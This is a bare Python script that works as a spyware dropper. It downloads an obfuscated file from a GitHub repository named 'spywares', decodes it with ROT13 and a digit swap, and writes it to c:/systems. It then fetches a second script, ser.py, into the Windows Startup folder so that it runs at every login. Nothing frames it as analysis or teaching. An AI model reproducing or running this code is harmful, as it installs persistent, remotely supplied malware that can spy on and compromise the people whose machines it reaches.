try:
    import requests
except:
    os.system("py -m pip install requests")
finally:
    import requests

import os

user = os.environ['username']

def cycle(s):
    d = {}
    for c in (65, 97):
        for i in range(26):
            d[chr(i+c)] = chr((i+13) % 26 + c)

    st = ("".join([d.get(c, c) for c in s]))
    st2=""
    key = {'1':'4', '2':'0', '3':'8', '4':'1', '5':'6', '6':'5', '7':'9', '8':'3', '9':'7', '0':'2'}
    for x in st:
        if x in key:
            st2=st2+key[x]
        else:
            st2=st2+x

    return st2


response = requests.get("https://raw.githubusercontent.com/PVER-Programz/spywares/refs/heads/main/firebow/tempest.zypher")
tempest = cycle(response.text)

# print(tempest)
try:
    with open("c:/systems/tempest.json", 'w') as f:
        f.write(tempest)
except FileNotFoundError:
    os.mkdir("c:/systems")
    with open("c:/systems/tempest.json", 'w') as f:
        f.write(tempest)
os.chdir(f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
response = requests.get('https://raw.githubusercontent.com/PVER-Programz/spywares/refs/heads/main/firebow/ser.py')
code = response.content
with open("ser.py", "wb") as f:
    f.write(code)
